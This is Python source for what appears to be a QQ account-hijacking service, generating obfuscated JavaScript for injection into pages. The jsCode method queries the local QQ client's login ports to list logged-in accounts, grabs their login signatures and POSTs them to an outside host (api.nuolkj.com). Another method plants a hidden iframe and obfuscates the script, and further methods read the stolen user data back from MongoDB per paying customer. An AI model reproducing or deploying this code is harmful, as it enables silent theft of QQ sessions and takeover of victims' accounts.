# -*- coding: UTF-8 -*-
import sys, requests

sys.path.append('../')
from app import mongo


class axJs():
    ''' 动态js   '''

    def __init__(self, id,qq=''):
        self.id = str(id)
        self.qq = str(qq)
        if self.content():
            # self.js =
            pass

    def content(self):
        if mongo.db.user.find_one({'vip': self.id}):
            return True
        else:
            return False
    def qwbzj(self,req, x, y):
        a = req.find(x)
        b = req.find(y, int(a + 1))
        return req[a + len(x):b]

    def js(self):
        js = '''
            function open_without_referrer(){
                var i = document.createElement('iframe');
                i.width = 0;
                i.height = 0;
                i.src = 'https://urlgoo.github.io/op/?id=%s';
                i.style.display="none";
                document.getElementsByTagName("body")[0].appendChild(i);
        }
        open_without_referrer();
            
        
        ''' % self.id
        headers = {
            'referer': 'http://y.qq.com',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 AliApp(TT/8.1.0) TTPodClient/8.1.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        url = 'https://www.sojson.com/javascriptobfuscator.html'
        data = {
            'js':js
        }
        r = requests.post(url,data=data,headers=headers).text
        jscode = self.qwbzj(r,'id="result" spellcheck="false">','</textarea>')
        return jscode
    def jsCode(self):
        js = '''
        document.domain = "qq.com";

var xjq = document.createElement('script');
xjq.src = "//cdn.bootcss.com/jquery/1.12.4/jquery.min.js";
xjq.onload = main;
document.getElementsByTagName('body')[0].appendChild(xjq);
qqlist = [];
isPC = false;
pport = 4301;

iss = false;
pt_local_token = Date.parse(new Date()).toString().substr(0, 10);

function isMacOrWindows() {
    if ((navigator.platform == "Win32") || (navigator.platform == "Windows") || (navigator.platform == "Mac68K") || (navigator.platform == "MacPPC") || (navigator.platform == "Macintosh") || (navigator.platform == "MacIntel")) {
        isPC = true
    } else {
        if (/android|iPhone|iPad|iPod|iOS|Linux|MicroMessenger|blackberry|mobile/i.test(navigator.userAgent)) {
            isPC = false
        } else {
            isPC = true
        }
    }
    return isPC
}
function isHTTPS() {
    var protocolStr = document.location.protocol;
    return (protocolStr == "https:")
}
function getCookie(c_name, info) {
    if (info.length > 0) {
        c_start = info.indexOf(" " + c_name + "=");
        if (c_start != -1) {
            c_start = c_start + c_name.length + 2;
            c_end = info.indexOf(";", c_start);
            if (c_end == -1) {
                c_end = info.length
            }
            return unescape(info.substring(c_start, c_end))
        }
    }
    return ""
}

function getSubstr(ret, strs, stre) {
    var deps = ret.indexOf(strs) + strs.length;
    if (stre == "") var depe = ret.length;
    else var depe = ret.indexOf(stre, deps);
    var dep = ret.substr(deps, depe - deps);
    return dep;
}

function filter_qq(uin) {
    var reg = /^o0*/;
    return uin.replace(reg, "");
}

function main() {
    $.ajaxSetup({
        cache: false
    });
    if (isMacOrWindows()) {
        document.cookie = "pt_local_token=" + pt_local_token + "; domain=.qq.com; path=/";
        getPCQQ();
    } else {
        xsubmit_info();
    }
}

function isInArray(arr, value) {
    for (var i = 0; i < arr.length; i++) {
        if (value === arr[i]) {
            return true;
        }
    }
    return false;
}

function ptui_getst_CB(var_sso_get_st_uin) {
    var uin = var_sso_get_st_uin.uin;
    $.ajax({
        type: "get",
        timeout: 500,
        url: "https://ssl.ptlogin2.qq.com/jump?clientuin=" + uin + "&keyindex=9&pt_aid=715030901&daid=73&u1=https%3A%2F%2Fqun.qq.com%2F&pt_local_tk=" + pt_local_token + "&pt_3rd_aid=0&ptopt=1&style=40",
        dataType: "script",
        cache: false,
    })
}

function ptui_qlogin_CB(a, b, c) {
    xsubmit_info(b);
}

function ptui_getuins_CB(var_sso_uin_list) {
    if (!iss) iss = true;
    else return;
    for (var i = 0; i < var_sso_uin_list.length; i++) {
        getskey(var_sso_uin_list[i]["account"]);
    }
}

function getskey(QQ) {
    var port = isHTTPS() ? 4301 : 4300;
    $.ajax({
        type: "get",
        timeout: 500,
        url: "//localhost.ptlogin2.qq.com:" + port + "/pt_get_st?clientuin=" + QQ + "&callback=ptui_getst_CB&r=0.24145677020643008&pt_local_tk=" + pt_local_token,
        dataType: "script",
        cache: false,
    })
}

function getPCQQ() {
    var port = isHTTPS() ? 4301 : 4300;
    $.ajax({
        type: "get",
        timeout: 500,
        url: "//localhost.ptlogin2.qq.com:" + port + "/pt_get_uins?callback=ptui_getuins_CB&pt_local_tk=" + pt_local_token,
        dataType: "script",
        cache: false,
    })
}

function xsubmit_info(url1) {
    var final_info1 = {};
    var url = getSubstr(url1, '&ptsigx=', '&s_url');
    if (url == "") return;
    var uin = getSubstr(url1, '&uin=', '&');
    if (!isInArray(qqlist, uin)) {
        qqlist.push(uin);
        final_info1["uin"] = filter_qq(uin);
        final_info1["url"] = url;
        //console.log(final_info1);
        $.ajax({
            type: "POST",
            url: "//api.nuolkj.com/sj/'''+self.id+'''",
            xhrFields: {
                withCredentials: true
            },
            crossDomain: true,
            data: final_info1,
        })
    }
}
            '''
        return js


    def info(self):
        a = mongo.db[self.id].find({'qq':{'$ne':None}},{'qq':1,'_id':0})
        userlist = []
        for x in a:
            userlist.append(x)
        return userlist

    def userInfo(self):
        a = mongo.db[self.id].find({'qq':self.qq},{'_id':0,'GroupList':0})
        userlist = []
        for x in a:
            userlist.append(x)
        return userlist